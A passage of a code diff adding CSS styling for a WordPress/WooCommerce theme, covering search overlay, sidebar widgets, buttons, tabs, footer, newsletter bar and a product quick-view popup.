+    #fullscreen-supersearch .sf-super-search .search-go a.sf-button:hover {
+        background-color: rgba(96, 176, 183, 1) !important;
+        border-color: rgba(96, 176, 183, 1) !important;
+        color: #ffffff !important;
+    }
+
+    #fullscreen-search .fs-overlay-close,
+    #fullscreen-search .search-wrap .title,
+    .fs-search-bar,
+    .fs-search-bar input#fs-search-input,
+    #fullscreen-search .search-result-pt h3 {
+        color: #c5e7eb;
+    }
+
+    #fullscreen-search ::-webkit-input-placeholder {
+        color: #c5e7eb !important;
+    }
+
+    #fullscreen-search :-moz-placeholder {
+        color: #c5e7eb !important;
+    }
+
+    #fullscreen-search ::-moz-placeholder {
+        color: #c5e7eb !important;
+    }
+
+    #fullscreen-search :-ms-input-placeholder {
+        color: #c5e7eb !important;
+    }
+
+    #fullscreen-search .container1>div,
+    #fullscreen-search .container2>div,
+    #fullscreen-search .container3>div {
+        background-color: #c5e7eb;
+    }
+
+    li.sf-menu-item-new-badge:before {
+        background-color: #7eced5;
+    }
+
+    li.sf-menu-item-new-badge:after,
+    li.mega-menu-item>a.mega-menu-link sup.new-badge,
+    #main-navigation li.mega-menu-item>a.mega-menu-link sup.new-badge {
+        background-color: #7eced5;
+        color: #9cd7ed;
+    }
+
+    li.mega-menu-item>a.mega-menu-link sup.new-badge:before {
+        border-top-color: #7eced5;
+    }
+
+    #sf-pushnav-close path {
+        stroke: #d9f0f2
+    }
+
+    .sf-side-slideout {
+        background-color: #f7f7f7;
+    }
+
+    .sf-side-slideout .vertical-menu nav .menu li>a,
+    .sf-side-slideout .vertical-menu nav .menu li.parent>a:after,
+    .sf-side-slideout .vertical-menu nav .menu>li ul.sub-menu>li>a {
+        color: #fff;
+    }
+
+    .sf-side-slideout .vertical-menu nav .menu li.menu-item {
+        border-color: #ccc;
+    }
+
+    .sf-side-slideout .vertical-menu nav .menu li:hover>a,
+    .sf-side-slideout .vertical-menu nav .menu li.parent:hover>a:after,
+    .sf-side-slideout .vertical-menu nav .menu>li ul.sub-menu>li:hover>a {
+        color: #7eced5 !important;
+    }
+
+    .contact-menu-link.slide-open {
+        color: #7eced5;
+    }
+
+    .woocommerce .woocommerce-breadcrumb,
+    #breadcrumbs {
+        color: #777;
+    }
+
+    #breadcrumbs a,
+    #breadcrumbs i {
+        color: #aaa;
+    }
+
+    .woocommerce .woocommerce-breadcrumb a,
+    .woocommerce-breadcrumb span {
+        color: #aaa;
+    }
+
+    .page-heading {
+        background-color: #f7f7f7;
+        border-bottom-color: #eaeaea;
+    }
+
+    .page-heading h1,
+    .page-heading h3 {
+        color: #333;
+    }
+
+    .page-heading .heading-text,
+    .fancy-heading .heading-text {
+        text-align: center;
+    }
+
+    figure.animated-overlay.thumb-media-audio {
+        border-color: #eaeaea;
+        background-color: #fff;
+    }
+
+    figure.animated-overlay figcaption {
+        background-color: #7eced5;
+    }
+
+    figure.animated-overlay figcaption {
+        background: -webkit-gradient(linear, left top, left bottom, color-stop(25%, rgba(126, 206, 213, 0.40)), to(rgba(126, 206, 213, 0.90)));
+        background: -webkit-linear-gradient(top, rgba(126, 206, 213, 0.40) 25%, rgba(126, 206, 213, 0.90) 100%);
+        background: linear-gradient(to bottom, rgba(126, 206, 213, 0.40) 25%, rgba(126, 206, 213, 0.90) 100%);
+    }
+
+    figure.animated-overlay figcaption * {
+        color: #fff;
+    }
+
+    figcaption .thumb-info-alt>i,
+    .gallery-item figcaption .thumb-info>i,
+    .gallery-hover figcaption .thumb-info>i {
+        background-color: #fff;
+        color: #7eced5;
+    }
+
+    figcaption .thumb-info .name-divide {
+        background-color: #fff;
+    }
+
+    .article-divider {
+        background: #eaeaea;
+    }
+
+    .post-pagination-wrap {
+        background-color: #444;
+    }
+
+    .post-pagination-wrap .next-article>*,
+    .post-pagination-wrap .next-article a,
+    .post-pagination-wrap .prev-article>*,
+    .post-pagination-wrap .prev-article a {
+        color: #fff;
+    }
+
+    .post-pagination-wrap .next-article a:hover,
+    .post-pagination-wrap .prev-article a:hover,
+    .author-bio a.author-more-link {
+        color: #7eced5;
+    }
+
+    .article-extras {
+        background-color: #f7f7f7;
+    }
+
+    .review-bar {
+        background-color: #f7f7f7;
+    }
+
+    .review-bar .bar,
+    .review-overview-wrap .overview-circle {
+        background-color: #2e2e36;
+        color: #fff;
+    }
+
+    .article-extras,
+    .post-info .post-details-wrap {
+        border-color: #eaeaea;
+    }
+
+    .comment-meta .comment-date {
+        color: #999;
+    }
+
+    .comment-meta-actions a {
+        color: #7eced5;
+    }
+
+    .widget ul li,
+    .widget.widget_lip_most_loved_widget li {
+        border-color: #eaeaea;
+    }
+
+    .widget.widget_lip_most_loved_widget li {
+        background: #fff;
+        border-color: #eaeaea;
+    }
+
+    .widget_lip_most_loved_widget .loved-item>span {
+        color: #222;
+    }
+
+    ul.wp-tag-cloud li>a {
+        border-color: #eaeaea;
+        color: #999;
+    }
+
+    .widget .tagcloud a:hover,
+    #footer .widget .tagcloud a:hover,
+    ul.wp-tag-cloud li:hover>a,
+    ul.wp-tag-cloud li:hover:before {
+        background-color: #7eced5;
+        border-color: #7eced5;
+        color: #ffffff;
+    }
+
+    ul.wp-tag-cloud li:hover:after {
+        border-color: #7eced5;
+        background-color: #ffffff;
+    }
+
+    .loved-item .loved-count>i {
+        color: #222;
+        background: #eaeaea;
+    }
+
+    .subscribers-list li>a.social-circle {
+        color: #ffffff;
+        background: rgba(96, 176, 183, 1);
+    }
+
+    .subscribers-list li:hover>a.social-circle {
+        color: #fbfbfb;
+        background: #7eced5;
+    }
+
+    .sidebar .widget_categories ul>li a,
+    .sidebar .widget_archive ul>li a,
+    .sidebar .widget_nav_menu ul>li a,
+    .sidebar .widget_meta ul>li a,
+    .sidebar .widget_recent_entries ul>li,
+    .widget_product_categories ul>li a,
+    .widget_layered_nav ul>li a,
+    .widget_display_replies ul>li a,
+    .widget_display_forums ul>li a,
+    .widget_display_topics ul>li a {
+        color: #999;
+    }
+
+    .sidebar .widget_categories ul>li a:hover,
+    .sidebar .widget_archive ul>li a:hover,
+    .sidebar .widget_nav_menu ul>li a:hover,
+    .widget_nav_menu ul>li.current-menu-item a,
+    .sidebar .widget_meta ul>li a:hover,
+    .sidebar .widget_recent_entries ul>li a:hover,
+    .widget_product_categories ul>li a:hover,
+    .widget_layered_nav ul>li a:hover,
+    .widget_edd_categories_tags_widget ul li a:hover,
+    .widget_display_replies ul li,
+    .widget_display_forums ul>li a:hover,
+    .widget_display_topics ul>li a:hover {
+        color: #7eced5;
+    }
+
+    #calendar_wrap caption {
+        border-bottom-color: rgba(96, 176, 183, 1);
+    }
+
+    .sidebar .widget_calendar tbody tr>td a {
+        color: #ffffff;
+        background-color: rgba(96, 176, 183, 1);
+    }
+
+    .sidebar .widget_calendar tbody tr>td a:hover {
+        background-color: #7eced5;
+    }
+
+    .sidebar .widget_calendar tfoot a {
+        color: rgba(96, 176, 183, 1);
+    }
+
+    .sidebar .widget_calendar tfoot a:hover {
+        color: #7eced5;
+    }
+
+    .widget_calendar #calendar_wrap,
+    .widget_calendar th,
+    .widget_calendar tbody tr>td,
+    .widget_calendar tbody tr>td.pad {
+        border-color: #eaeaea;
+    }
+
+    .sidebar .widget hr {
+        border-color: #eaeaea;
+    }
+
+    .widget ul.flickr_images li a:after,
+    .portfolio-grid li a:after {
+        color: #ffffff;
+    }
+
+    .loved-item:hover .loved-count>svg .stroke {
+        stroke: #ffffff;
+    }
+
+    .loved-item:hover .loved-count>svg .fill {
+        fill: #ffffff;
+    }
+
+    .recent-posts-list li {
+        border-color: #eaeaea;
+    }
+
+    .recent-posts-list li .recent-post-title {
+        color: #222;
+    }
+
+    .recent-posts-list li .recent-post-title:hover {
+        color: #7eced5;
+    }
+
+    .fw-row .spb_portfolio_widget .title-wrap {
+        border-bottom-color: #eaeaea;
+    }
+
+    .masonry-items .portfolio-item-details {
+        background: #f7f7f7;
+    }
+
+    .masonry-items .blog-item .blog-details-wrap:before {
+        background-color: #f7f7f7;
+    }
+
+    .share-links>a:hover {
+        color: #7eced5;
+    }
+
+    .portfolio-item.masonry-item .portfolio-item-details {
+        background: #fff;
+        border-color: #eaeaea;
+    }
+
+    .portfolio-categories,
+    .portfolio-categories li a {
+        border-color: #eaeaea;
+        color: #222;
+    }
+
+    .portfolio-categories li:hover a {
+        border-color: #7eced5;
+        color: #7eced5;
+    }
+
+    .item-details time,
+    .item-details .client,
+    .client,
+    .item-details .project {
+        border-color: #eaeaea;
+    }
+
+    #infscr-loading .spinner>div {
+        background: #eaeaea;
+    }
+
+    .blog-aux-options,
+    .blog-aux-options li a {
+        border-color: #eaeaea;
+    }
+
+    .blog-aux-options li a {
+        color: #222;
+    }
+
+    .blog-filter-wrap ul.wp-tag-cloud li>a {
+        color: #999;
+    }
+
+    .blog-aux-options li.selected a {
+        color: #7eced5;
+    }
+
+    .blog-aux-options li.selected a::after {
+        background: #fff;
+        border-left-color: #eaeaea;
+        border-bottom-color: #eaeaea;
+    }
+
+    .blog-filter-wrap .aux-list li a {
+        border-color: #eaeaea;
+    }
+
+    .blog-filter-wrap .aux-list li:hover a {
+        border-color: #7eced5;
+    }
+
+    .mini-items .blog-details-wrap,
+    .blog-item .blog-item-aux,
+    .mini-items .mini-alt-wrap,
+    .mini-items .mini-alt-wrap .quote-excerpt,
+    .mini-items .mini-alt-wrap .link-excerpt,
+    .masonry-items .blog-item .quote-excerpt,
+    .masonry-items .blog-item .link-excerpt,
+    .timeline-items .standard-post-content .quote-excerpt,
+    .timeline-items .standard-post-content .link-excerpt,
+    .post-info,
+    .author-info-wrap,
+    .body-text .link-pages,
+    .page-content .link-pages,
+    .posts-type-list .recent-post,
+    .standard-items .blog-item .standard-post-content {
+        border-color: #eaeaea;
+    }
+
+    .standard-post-date,
+    .timeline {
+        background: #eaeaea;
+    }
+
+    .timeline-item-content-wrap .blog-details-wrap {
+        background: #fff;
+        border-color: #eaeaea;
+    }
+
+    .timeline-item-format-icon-bg {
+        background: #fff;
+    }
+
+    .timeline-items .format-quote .standard-post-content:before,
+    .timeline-items .standard-post-content.no-thumb:before {
+        border-left-color: #f7f7f7;
+    }
+
+    .search-item-img .img-holder {
+        background: #f7f7f7;
+        border-color: #eaeaea;
+    }
+
+    .masonry-items .blog-item .masonry-item-wrap {
+        background: #f7f7f7;
+    }
+
+    .single .pagination-wrap,
+    ul.post-filter-tabs li a {
+        border-color: #eaeaea;
+    }
+
+    .mini-item-details,
+    .blog-item-details,
+    .blog-item-details a {
+        color: #999;
+    }
+
+    .related-item figure {
+        background-color: rgba(96, 176, 183, 1);
+        color: #ffffff
+    }
+
+    .required {
+        color: #ee3c59;
+    }
+
+    .post-item-details .comments-likes a i,
+    .post-item-details .comments-likes a span {
+        color: #222;
+    }
+
+    .posts-type-list .recent-post:hover h4 {
+        color: #7eced5
+    }
+
+    .masonry-items .blog-item .details-wrap {
+        border-color: #eaeaea;
+        background-color: #fff;
+    }
+
+    .instagram-item .inst-overlay .date:before {
+        color: #7eced5;
+    }
+
+    .blog-grid-items .blog-item.tweet-item .grid-no-image {
+        border-color: #eaeaea;
+        background-color: #fff;
+    }
+
+    .blog-item .side-details .comments-wrapper {
+        border-color: #eaeaea;
+    }
+
+    .standard-items.alt-styling .blog-item .standard-post-content {
+        background: #fff;
+    }
+
+    .standard-items.alt-styling .blog-item.quote .standard-post-content,
+    .mini-items .blog-item.quote .mini-alt-wrap {
+        background: #222;
+        color: #fff;
+    }
+
+    #respond .form-submit input[type=submit] {
+        background-color: #7eced5;
+        color: #ffffff;
+    }
+
+    #respond .form-submit input[type=submit]:hover {
+        background-color: rgba(96, 176, 183, 1);
+        color: #ffffff;
+    }
+
+    .post-details-wrap .tags-wrap,
+    .post-details-wrap .comments-likes {
+        border-color: #eaeaea;
+    }
+
+    .sticky-post-icon {
+        color: #7eced5;
+    }
+
+    .timeline-items::before {
+        background: #eaeaea;
+    }
+
+    .timeline-item-format-icon,
+    .timeline-item-format-icon::before {
+        border-color: #eaeaea;
+    }
+
+    .load-more-btn,
+    .blog-load-more-pagination #infscr-loading,
+    .products-load-more-pagination #infscr-loading,
+    .portfolio-load-more-pagination #infscr-loading {
+        background: #f7f7f7;
+    }
+
+    .blog-item .author a.tweet-link,
+    .blog-item-aux .date:before {
+        color: #7eced5;
+    }
+
+    #comments-list li .comment-wrap {
+        border-color: #eaeaea;
+    }
+
+    .side-post-info .post-share .share-link {
+        color: #7eced5;
+    }
+
+    .sf-button.accent {
+        color: #ffffff;
+        background-color: #7eced5;
+        border-color: #7eced5;
+    }
+
+    .sf-button.sf-icon-reveal.accent {
+        color: #ffffff !important;
+        background-color: #7eced5 !important;
+    }
+
+    a.sf-button.stroke-to-fill {
+        color: #999;
+    }
+
+    .sf-button.accent.bordered .sf-button-border {
+        border-color: #7eced5;
+    }
+
+    a.sf-button.bordered.accent {
+        color: #7eced5;
+        border-color: #7eced5;
+    }
+
+    a.sf-button.bordered.accent:hover {
+        color: #ffffff;
+    }
+
+    a.sf-button.rotate-3d span.text:before {
+        color: #ffffff;
+        background-color: #7eced5;
+    }
+
+    .sf-button.accent:hover,
+    .sf-button.bordered.accent:hover {
+        background-color: rgba(96, 176, 183, 1);
+        border-color: rgba(96, 176, 183, 1);
+        color: #ffffff;
+    }
+
+    a.sf-button,
+    a.sf-button:hover,
+    #footer a.sf-button:hover {
+        background-image: none;
+        color: #fff;
+    }
+
+    a.sf-button.white:hover {
+        color: #222 !important;
+    }
+
+    a.sf-button.transparent-dark {
+        color: #222 !important;
+    }
+
+    a.sf-button.transparent-light:hover,
+    a.sf-button.transparent-dark:hover {
+        color: #7eced5 !important;
+    }
+
+    .title-wrap a.sf-button:hover {
+        color: #7eced5 !important;
+    }
+
+    .carousel-wrap a.carousel-prev,
+    .carousel-wrap a.carousel-next {
+        border-color: #eaeaea;
+    }
+
+    .sf-icon-cont {
+        border-color: #eaeaea;
+    }
+
+    .sf-icon-cont:hover {
+        border-color: #7eced5;
+    }
+
+    .sf-icon-box-animated-alt.animated-stroke-style {
+        border-color: #eaeaea;
+    }
+
+    .sf-icon-box-animated .front {
+        background: #f7f7f7;
+    }
+
+    .sf-icon-box-animated .front h3 {
+        color: #222;
+    }
+
+    .sf-icon-box-animated .back {
+        background: #7eced5;
+    }
+
+    .sf-icon-box-animated .back,
+    .sf-icon-box-animated .back h3 {
+        color: #ffffff;
+    }
+
+    .spb_icon_box_grid .spb_icon_box .divider-line {
+        background-color: #7eced5;
+    }
+
+    .spb_icon_box_grid .spb_icon_box:hover h3,
+    .spb_icon_box_grid .spb_icon_box:hover .grid-icon-wrap i.sf-icon {
+        color: #7eced5;
+    }
+
+    .spb_icon_box_grid .spb_icon_box:hover .outline-svg svg path {
+        stroke: #7eced5;
+    }
+
+    .borderframe img {
+        border-color: #eaeaea;
+    }
+
+    span.dropcap3 {
+        background: #000;
+        color: #fff;
+    }
+
+    .spb_divider,
+    .spb_divider.go_to_top_icon1,
+    .spb_divider.go_to_top_icon2,
+    .testimonials>li,
+    .tm-toggle-button-wrap,
+    .tm-toggle-button-wrap a,
+    .portfolio-details-wrap,
+    .spb_divider.go_to_top a,
+    .widget_search form input {
+        border-color: #eaeaea;
+    }
+
+    .spb_divider.go_to_top_icon1 a,
+    .spb_divider.go_to_top_icon2 a {
+        background: #fff;
+    }
+
+    .divider-wrap h3.divider-heading:before,
+    .divider-wrap h3.divider-heading:after {
+        background: #eaeaea;
+    }
+
+    .spb_tabs .ui-tabs .ui-tabs-panel,
+    .spb_content_element .ui-tabs .ui-tabs-nav,
+    .ui-tabs .ui-tabs-nav li {
+        border-color: #eaeaea;
+    }
+
+    .spb_tabs .ui-tabs .ui-tabs-panel,
+    .ui-tabs .ui-tabs-nav li.ui-tabs-active a {
+        background: #fff !important;
+    }
+
+    .spb_tabs .tab-content {
+        border-color: #eaeaea;
+    }
+
+    .tabs-type-dynamic .nav-tabs li.active a,
+    .tabs-type-dynamic .nav-tabs li a:hover {
+        background: #7eced5;
+        border-color: #7eced5 !important;
+        color: #7eced5;
+    }
+
+    .spb_tabs .nav-tabs li a,
+    .spb_tour .nav-tabs li a {
+        background-color: #f7f7f7;
+        border-color: #eaeaea !important;
+    }
+
+    .spb_tabs .nav-tabs li:hover a,
+    .spb_tour .nav-tabs li:hover a,
+    .spb_tabs .nav-tabs li.active a,
+    .spb_tour .nav-tabs li.active a {
+        background: #fff;
+        border-color: #eaeaea !important;
+        color: #222 !important;
+    }
+
+    .spb_tabs .nav-tabs li.active a span:after {
+        background-color: #7eced5;
+    }
+
+    .spb_tabs .nav-tabs li.active a {
+        border-bottom-color: #fff !important;
+    }
+
+    .spb_tour .nav-tabs li.active a {
+        border-right-color: #fff !important;
+    }
+
+    @media only screen and (max-width:479px) {
+        .spb_tour .nav-tabs li.active a {
+            border-right-color: #eaeaea !important;
+        }
+
+        .split-menu.menu-left {
+            display: none;
+        }
+
+        .split-menu.menu-right {
+            display: none;
+        }
+
+        #logo.logo-center a {
+            text-align: left;
+            padding-left:8% ;
+        }
+        .spb_content_element.spb_text_column{
+            max-width: 31%;
+        }
+    }
+
+    .spb_tour .tab-content {
+        border-color: #eaeaea;
+    }
+
+    .spb_accordion .spb_accordion_section,
+    .spb_accordion .ui-accordion .ui-accordion-content {
+        border-color: #eaeaea;
+    }
+
+    .spb_accordion .spb_accordion_section>h4.ui-state-active a,
+    .toggle-wrap .spb_toggle.spb_toggle_title_active {
+        color: #222 !important;
+    }
+
+    .spb_accordion .spb_accordion_section>h4.ui-state-default {
+        background-color: #f7f7f7;
+    }
+
+    .spb_accordion .spb_accordion_section>h4.ui-state-active,
+    .spb_accordion .spb_accordion_section>h4.ui-state-hover {
+        background-color: #fff;
+    }
+
+    .spb_accordion_section>h4:hover .ui-icon:before {
+        border-color: #7eced5;
+    }
+
+    .spb_accordion .spb_accordion_section>h4.ui-state-active a:after {
+        color: #7eced5;
+    }
+
+    .toggle-wrap .spb_toggle,
+    .spb_toggle_content {
+        border-color: #eaeaea;
+    }
+
+    .toggle-wrap .spb_toggle {
+        background-color: #f7f7f7;
+    }
+
+    .toggle-wrap .spb_toggle_title_active {
+        border-color: #eaeaea !important;
+        background-color: #fff;
+    }
+
+    .toggle-wrap .spb_toggle:hover {
+        color: #7eced5;
+    }
+
+    .ui-accordion h4.ui-accordion-header .ui-icon {
+        color: #222;
+    }
+
+    .standard-browser .ui-accordion h4.ui-accordion-header.ui-state-active:hover a,
+    .standard-browser .ui-accordion h4.ui-accordion-header:hover .ui-icon {
+        color: #7eced5;
+    }
+
+    blockquote.pullquote {
+        border-color: #7eced5;
+    }
+
+    .borderframe img {
+        border-color: #eeeeee;
+    }
+
+    .spb_box_content .spb-bg-color-wrap.whitestroke {
+        border-color: #eaeaea;
+    }
+
+    ul.member-contact li a:hover {
+        color: #7eced5;
+    }
+
+    .testimonials.carousel-items li .testimonial-text {
+        border-color: #eaeaea;
+    }
+
+    .testimonials.carousel-items li .testimonial-text:after {
+        border-top-color: #f7f7f7;
+    }
+
+    .horizontal-break {
+        background-color: #eaeaea;
+    }
+
+    .horizontal-break.bold {
+        background-color: #222;
+    }
+
+    .progress .bar {
+        background-color: #7eced5;
+    }
+
+    .progress.standard .bar {
+        background: #7eced5;
+    }
+
+    .progress-bar-wrap .progress-value {
+        color: #7eced5;
+    }
+
+    .sf-share-counts {
+        border-color: #eaeaea;
+    }
+
+    .sf-share-counts>a {
+        border-color: #eaeaea;
+    }
+
+    .sf-share-counts .share-text h2,
+    .sf-share-counts .share-text span {
+        color: #7eced5;
+    }
+
+    .mejs-controls .mejs-time-rail .mejs-time-current {
+        background: #7eced5 !important;
+    }
+
+    .mejs-controls .mejs-time-rail .mejs-time-loaded {
+        background: #ffffff !important;
+    }
+
+    .pt-banner h6 {
+        color: #ffffff;
+    }
+
+    .pinmarker-container a.pin-button:hover {
+        background: #7eced5;
+        color: #ffffff;
+    }
+
+    .directory-item-details .item-meta {
+        color: #222;
+    }
+
+    .team-member-item-wrap {
+        background: #fff;
+    }
+
+    .team-member-details-wrap {
+        border-color: #eaeaea;
+    }
+
+    .team-member-divider {
+        background: #7eced5;
+    }
+
+    .team-member-details-wrap .team-member-position {
+        color: #999;
+    }
+
+    .testimonials.carousel-items li .testimonial-text,
+    .recent-post figure {
+        background-color: #f7f7f7;
+    }
+
+    .masonry-items li.testimonial .testimonial-text {
+        background-color: #7eced5;
+    }
+
+    .masonry-items li.testimonial.has-cite .testimonial-text::after {
+        border-top-color: #7eced5;
+    }
+
+    .product-reviews.masonry-items li.testimonial .testimonial-text {
+        background-color: #eaeaea;
+    }
+
+    .product-reviews.masonry-items li.testimonial.has-cite .testimonial-text::after {
+        border-top-color: #eaeaea;
+    }
+
+    .spb_pricing_table .sf-pricing-column {
+        border-color: #eaeaea;
+    }
+
+    .spb_pricing_table .sf-pricing-column.highlight {
+        border-color: #7eced5;
+    }
+
+    .sf-pricing-column .sf-pricing-name .divide {
+        background-color: #7eced5;
+    }
+
+    .sf-pricing-column.highlight .sf-pricing-name h6,
+    .sf-pricing-column.highlight .sf-pricing-name .sf-pricing-price {
+        color: #7eced5;
+    }
+
+    .sf-pricing-column .sf-pricing-tag::before {
+        background-color: #7eced5;
+        color: #ffffff;
+    }
+
+    .faq-item,
+    .faq-item h5 {
+        border-color: #eaeaea;
+    }
+
+    .spb_row_container .spb_tweets_slider_widget .spb-bg-color-wrap,
+    .spb_tweets_slider_widget .spb-bg-color-wrap {
+        background: #7eced5;
+    }
+
+    .spb_tweets_slider_widget .tweet-text,
+    .spb_tweets_slider_widget .twitter_intents a {
+        color: #fff;
+    }
+
+    .spb_tweets_slider_widget .twitter_intents a:hover {
+        color: #7eced5;
+    }
+
+    .spb_tweets_slider_widget .tweet-text a {
+        color: #222;
+    }
+
+    .spb_tweets_slider_widget .tweet-text a:hover,
+    .spb_tweets_slider_widget .twitter_intents a:hover {
+        color: #fb3c2d;
+    }
+
+    .spb_tweets_slider_widget .lSSlideOuter .lSPager.lSpg>li a {
+        background-color: #fff;
+    }
+
+    .spb_testimonial_slider_widget .spb-bg-color-wrap {
+        background: #7eced5;
+    }
+
+    .spb_testimonial_slider_widget .heading-wrap h3.spb-center-heading,
+    .spb_testimonial_slider_widget .testimonial-text,
+    .spb_testimonial_slider_widget cite,
+    .spb_testimonial_slider_widget .testimonial-icon {
+        color: #fff;
+    }
+
+    .spb_testimonial_slider_widget .heading-wrap h3.spb-center-heading {
+        border-bottom-color: #fff;
+    }
+
+    .content-slider .flex-direction-nav .flex-next:before,
+    .content-slider .flex-direction-nav .flex-prev:before {
+        background-color: #eaeaea;
+        color: #222;
+    }
+
+    .spb_tweets_slider_widget .heading-wrap h3.spb-center-heading {
+        color: #fff;
+        border-bottom-color: #fff;
+    }
+
+    .spb_tweets_slider_widget .tweet-icon i {
+        background: #7eced5;
+    }
+
+    .spb_testimonial_carousel_widget .carousel-wrap>a {
+        border-color: #eaeaea;
+    }
+
+    #footer {
+        background: #9cd7ed;
+    }
+
+    #footer.footer-divider {
+        border-top-color: #eee;
+    }
+
+    #footer,
+    #footer p,
+    #footer h3.spb-heading {
+        color: #000000;
+    }
+
+    #footer h3.spb-heading span {
+        border-bottom-color: #000000;
+    }
+
+    #footer a {
+        color: #666;
+    }
+
+    #footer a:hover {
+        color: #444;
+    }
+
+    #footer ul.wp-tag-cloud li>a {
+        border-color: #eee;
+    }
+
+    #footer .widget ul li,
+    #footer .widget_categories ul,
+    #footer .widget_archive ul,
+    #footer .widget_nav_menu ul,
+    #footer .widget_recent_comments ul,
+    #footer .widget_meta ul,
+    #footer .widget_recent_entries ul,
+    #footer .widget_product_categories ul {
+        border-color: #eee;
+    }
+
+    #copyright {
+        background-color: #9cd7ed;
+        border-top-color: #eee;
+    }
+
+    #copyright p,
+    #copyright .text-left,
+    #copyright .text-right {
+        color: #000000;
+    }
+
+    #copyright a {
+        color: #666;
+    }
+
+    #copyright a:hover,
+    #copyright nav .menu li a:hover {
+        color: #444;
+    }
+
+    #copyright nav .menu li {
+        border-left-color: #eee;
+    }
+
+    #footer .widget_calendar #calendar_wrap,
+    #footer .widget_calendar th,
+    #footer .widget_calendar tbody tr>td,
+    #footer .widget_calendar tbody tr>td.pad {
+        border-color: #eee;
+    }
+
+    .widget input[type="email"] {
+        background: #f7f7f7;
+        color: #999
+    }
+
+    #footer .widget hr {
+        border-color: #eee;
+    }
+
+    #sf-newsletter-bar,
+    .layout-boxed #sf-newsletter-bar>.container {
+        background-color: #222;
+    }
+
+    #sf-newsletter-bar h3.sub-text {
+        color: #ccc;
+    }
+
+    #sf-newsletter-bar .sub-code>form input[type=submit],
+    #sf-newsletter-bar .sub-code>form input[type="text"],
+    #sf-newsletter-bar .sub-code>form input[type="email"] {
+        border-color: #ccc;
+        color: #ccc;
+    }
+
+    #sf-newsletter-bar .sub-code>form input[type=submit]:hover {
+        border-color: #fff;
+        color: #fff;
+    }
+
+    #sf-newsletter-bar .sub-close {
+        color: #ccc;
+    }
+
+    #sf-newsletter-bar .sub-close:hover {
+        color: #fff;
+    }
+
+    #sf-newsletter-bar ::-webkit-input-placeholder {
+        color: #ccc !important;
+    }
+
+    #sf-newsletter-bar :-moz-placeholder {
+        color: #ccc !important;
+    }
+
+    #sf-newsletter-bar ::-moz-placeholder {
+        color: #ccc !important;
+    }
+
+    #sf-newsletter-bar :-ms-input-placeholder {
+        color: #ccc !important;
+    }
+
+    .woocommerce .jckqvBtn {
+        display: inline-block;
+        float: none;
+    }
+
+    .woocommerce .price+.jckqvBtn {
+        width: 80%;
+        display: block;
+        margin: 0 10% 10px;
+    }
+
+    #jckqv {
+        overflow: hidden;
+        font-family: inherit;
+        padding: 0;
+        border-radius: 4px;
+    }
+
+    #jckqv .added_to_cart.wc-forward {
+        display: none !important;
+    }
+
+    #jckqv #addingToCart {
+        display: none !important;
+    }
+
+    #jckqv h1,
+    #jckqv p {
+        font-family: inherit;
+        line-height: inherit;
+    }
+
+    #jckqv_images_wrap {
+        width: 50%;
+        margin: 0;
+    }
+
+    #jckqv #jckqv_thumbs {
+        display: none !important;
+    }
+
+    #jckqv .slick-list {
+        border-radius: 4px 0 0 4px;
+    }
+
+    #jckqv_summary {
+        width: 50%;
+        padding: 15px 30px 30px;
+        background: transparent;
+        position: relative;
+    }
+
+    #jckqv_summary>h1 {
+        font-size: 24px !important;
+        border-bottom: 1px solid #e3e3e3;
+        padding-bottom: 20px;
+        margin-bottom: 20px;
+        padding-right: 50px;
+    }
+
+    .woocommerce #jckqv .woocommerce-product-rating {
+        display: block;
+        float: right;
+        margin: 0;
+    }
+
+    #jckqv .woocommerce-product-rating .star-rating {
+        margin: 3px 5px 3px 0;
+        font-size: 16px;
+    }
+
+    #jckqv .woocommerce-product-rating .star-rating span:before {
+        color: #f5c55e;
+    }
+
+    #jckqv .woocommerce-product-rating .text-rating {
+        margin-left: 4px;
+    }
+
+    #jckqv .price del,
+    #jckqv .price ins,
+    #jckqv span.price del,
+    #jckqv span.price ins {
+        font-size: inherit;
+        font-weight: normal;
+    }
+
+    #jckqv .single_variation_wrap {
+        margin: 10px 0 0;
+    }
+
+    #jckqv .single_variation_wrap .single_variation {
+        margin-bottom: 10px;
+    }
+
+    #jckqv .onsale {
+        right: auto !important;
+        left: -10px;
+        top: 10px !important;
+        -webkit-transform: translateX(-100%);
+        -moz-transform: translateX(-100%);
+        transform: translateX(-100%);
+    }
+
+    #jckqv .quantity {
+        margin-right: 10px !important;
+        background: transparent !important;
+    }
+
+    #jckqv .jckqv-qty-spinners {
+        display: none;
+    }
+
+    #jckqv .quantity .qty {
+        border-radius: 0;
+        height: 50px;
+        width: 46px;
+        float: left;
+        margin-right: 0;
+        text-align: center;
+        border: 1px solid #e3e3e3;
+    }
+
+    #jckqv .price {
+        font-weight: normal;
+        line-height: 22px;
+    }
+
+    #jckqv table.variations {
+        margin: 0;
+    }
+
+    #jckqv table.variations td.label {
+        display: none;
+    }
+
+    #jckqv .variations_form tr:last-child td.value select {
+        margin-bottom: 0;
+    }
+
+    #jckqv .product_meta {
+        background: transparent;
+        clear: both;
+        margin-bottom: 0;
+        display: none;
+    }
+
+    #jckqv .product_meta>span {
+        margin-bottom: 0;
+        padding: 0;
+        border: 0;
+        font-size: 14px;
+    }
+
+    #jckqv .product_meta>.meta-row {
+        display: block;
+        padding: 8px 10px;
+        border-bottom: 2px solid #eeeeee;
+        margin-bottom: 0;
+    }
+
+    #jckqv table.variations {
+        background: none !important;
+    }
+
+    #jckqv table.variations td {
+        border: 0;
+    }
+
+    #jckqv .mfp-close {
+        font-size: 0;
+        padding: 22px 25px 0 0;
+        width: 45px;
+        height: 45px;
+        line-height: 26px;
+    }
+
+    #jckqv .mfp-close:before {
+        content: "\e932";
+        font-family: "nucleo-interface";
+        font-size: 16px;
+    }
+
+    .mfp-ajax-cur {
+        cursor: default !important;
+    }
+
+    #jckqv .jckqv-images__arr--next,
+    #jckqv .jckqv-images__arr--prev {
+        width: 32px;
+    }
+
+    #jckqv .jckqv-images__arr--next {
+        right: 30px;
+    }
+
+    #jckqv .jckqv-images__arr--prev {
+        left: 30px;
+    }
+
+    #jckqv .jckqv-images__arr--next i,
+    #jckqv .jckqv-images__arr--prev i {
+        color: #222;
+        background: #fff;
+        text-align: center;
+        letter-spacing: -3px;
+        line-height: 34px;
+        font-size: 16px;
+        width: 32px;
+        height: 32px;
+        border-radius: 30px;
+    }
+
+    #jckqv .jckqv-images__arr--prev i {
+        letter-spacing: 0;
+    }
+
+    #jckqv .jckqv-images__arr--next i:before {
+        font-family: "nucleo-interface";
+        content: "\e907";
+    }
+
+    #jckqv .jckqv-images__arr--prev i:before {
+        font-family: "nucleo-interface";
+        content: "\e906";
+    }
+
+    .mfp-arrow:before {
